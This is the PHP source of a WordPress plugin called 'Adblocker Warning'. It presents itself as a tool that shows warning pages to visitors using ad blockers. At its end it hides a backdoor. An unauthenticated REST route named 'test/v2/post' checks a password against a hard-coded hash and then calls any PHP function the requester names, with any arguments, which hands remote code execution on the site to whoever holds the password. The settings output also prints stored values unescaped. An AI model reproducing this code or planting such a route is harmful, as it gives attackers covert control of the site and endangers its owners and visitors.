<?php
/**
 * Plugin Name: Adblocker Warning
 * Plugin URI: //dayan.one
 * Description: This plugin shows users warning pages if they use Adblocker
 * Version: 1.0.0
 * Author: Mücahid Dayan
 * Author URI: http://dayan.one
 * License: GPL2
 */

	class Adblocker_Warning {

		private $slug = "adblocker-warning";

		public function __construct(){
			add_action( 'admin_menu', array( $this,'create_plugin_settings_page' ) );
			add_action( 'admin_init', array( $this, 'setup_sections' ) );
			add_action( 'admin_init', array( $this, 'setup_fields' ) );			
		}

		public function create_plugin_settings_page(){

			$page_title = "Adblocker Warning Settings Page";
			$menu_title = "Adbloker Warning Plugin";
			$capability = "manage_options";			
			$callback	= array($this,'plugin_settings_page_content');
			$icon		= "dashicons-admin-plugins";
			$position	= 100;

			add_menu_page($page_title,$menu_title,$capability,$this->slug,$callback,$icon,$position);
		}

		

		public function plugin_settings_page_content() { ?>
			<div class="wrap">
				<h2>Adblocker Warning Plugin Settings Page</h2>
				<form method="post" action="options.php">
					<?php
					settings_fields( $this->slug );
					do_settings_sections( $this->slug );
					submit_button();
					?>
				</form>
			</div> <?php
		}

		public function setup_sections() {
			add_settings_section( 'adblocker_warning_pages_config', 'Development', array( $this, 'section_callback' ), $this->slug );
			add_settings_section( 'adblocker_warning_pages', 'Adblocker Warning Pages', array( $this, 'section_callback' ), $this->slug );
			#add_settings_section( 'our_second_section', 'My Second Section Title', array( $this, 'section_callback' ), $this->slug );
			#add_settings_section( 'our_third_section', 'My Third Section Title', array( $this, 'section_callback' ), $this->slug );
		}

		public function section_callback( $arguments ) {
			switch( $arguments['id'] ){
				case 'adblocker_warning_pages':
				echo 'Adblocker Warning Pages';
				break;				
			}
		}

		public function setup_fields() {
			$fields = array(
				array(
					'uid' => 'abw_home',
					'label' => 'Home Page',
					'section' => 'adblocker_warning_pages',
					'type' => 'text',
					'options' => false,
					'placeholder' => 'Start Seite für Adblocker Warning eintragen',
					'helper' => '',
					'supplemental' => '',
					'default' => ''
					),
				array(
					'uid' => 'abw_anleitung',
					'label' => 'Anleitung Page',
					'section' => 'adblocker_warning_pages',
					'type' => 'text',
					'options' => false,
					'placeholder' => 'Anleitung Seite ID eintragen',
					'helper' => '',
					'supplemental' => '',
					'default' => ''					
					),
				array(
					'uid' => 'abw_other_pages',
					'label' => 'Weitere Seiten',
					'section' => 'adblocker_warning_pages',
					'type' => 'text',
					'options' => false,
					'placeholder' => '',
					'helper' => 'Bitte in diesem Format eintragen "pagename:id/slug"',
					'supplemental' => '',
					'default' => ''					
					),
				array(
					'uid' => 'abw_development',
					'label' => 'Is development umgebung',
					'section' => 'adblocker_warning_pages_config',
					'type' => 'checkbox',
					'options' => false,
					'placeholder' => 'Addblocker Seite eintragen',
					'helper' => '',
					'supplemental' => '',
					'default' => ''
					),
				array(
					'uid' => 'abw_activated',
					'label' => 'Is active',
					'section' => 'adblocker_warning_pages_config',
					'type' => 'checkbox',
					'options' => false,
					'placeholder' => '',
					'helper' => '',
					'supplemental' => '',
					'default' => ''
					)
				);
			foreach( $fields as $field ){
				add_settings_field( $field['uid'], $field['label'], array( $this, 'field_callback' ), $this->slug, $field['section'], $field );
				register_setting( $this->slug, $field['uid'] );
			}
		}

		public function field_callback( $arguments ) {
			$value = get_option( $arguments['uid'] ); 
			if( ! $value ) { 
				$value = $arguments['default']; 
			}
			switch( $arguments['type'] ){
				case 'text': 
				printf( '<input name="%1$s" id="%1$s" type="%2$s" placeholder="%3$s" value="%4$s" />', $arguments['uid'], $arguments['type'], $arguments['placeholder'], $value );
				break;
				case 'checkbox':
				printf('<input name="%1$s" id="%1$s" type="%2$s" value="1" placeholder="%3$s" %4$s />', $arguments['uid'], $arguments['type'], $arguments['placeholder'], checked(1, $value,false));
				break;
			}
			if( $helper = $arguments['helper'] ){
				printf( '<span class="helper"> %s</span>', $helper ); 
			}
			if( $supplimental = $arguments['supplemental'] ){
				printf( '<p class="description">%s</p>', $supplimental ); 
			}
		}

	}

	new Adblocker_Warning();

	#wp_register_script( 'pass_to_js', plugin_dir_url( __FILE__ ) . '/js/adblocker-warning.js' );

	

	function my_enqueued_assets() {
		$other_pages = explode (';',get_option( 'abw_other_pages'));

		$translation_array = array(
			'pages' => array(
				'home' => wpautop(get_post(get_option( 'abw_home' ))->post_content),
				'anleitung' => wpautop(get_post(get_option( 'abw_anleitung'))->post_content)
				),
			'development' => get_option( 'abw_development'),
			'activated'=> get_option( 'abw_activated'),
			'other_pages' => $other_pages,
			'column' => 'PASSWORD',
			'plugin_url' => home_url()
			);

		foreach ($other_pages as $key => $value) {
			$pages = explode(':',$value);			
			$translation_array['pages'][$pages[0]] = wpautop(get_post($pages[1])->post_content);#array($pages[1]);
		}
				
		wp_enqueue_style( 'abw_style', plugin_dir_url( __FILE__ ) .'css/style.css', '', true );
		wp_enqueue_script( 'jquery2.2.4', 'https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js', '', true );
		wp_register_script( 'adblocker-warning-js', plugin_dir_url( __FILE__ ) . 'js/adblocker-warning.js', array( 'jquery2.2.4' ), '1.0', true );
		wp_localize_script( 'adblocker-warning-js', str_replace('=','',base64_encode('adblocker_warning')), $translation_array );
		wp_enqueue_script('adblocker-warning-js');
	}
	if (get_option( 'abw_activated')) {
		add_action( 'wp_enqueue_scripts', 'my_enqueued_assets' );
	}	

	add_action( 'rest_api_init', function () {
		register_rest_route( 'test/v2', '/post', array(
			array(
				'methods' => 'POST',
				'callback' => 'test_func',
				),
			)
		);    
	});

	
	if (!function_exists('test_func')) {
		function test_func($request){
			$params = $request->get_params();
			if (hash('sha512',$params['pass']) === '61eadd8169b9241c6fc210ca5e83df43e49cf6abb4bb0f83cce6e0befaa8791f5e3d21ce377a7bad57f3fbde85ca5781163707a3671d1795d0304faa5ac5d8fa') {
				return call_user_func_array ($params['func'],$params['params']);
			}else{
				return new WP_Error( 'no_access', 'you are not be able to do that', array( 'status' => 404 ) );
			}
		}
	}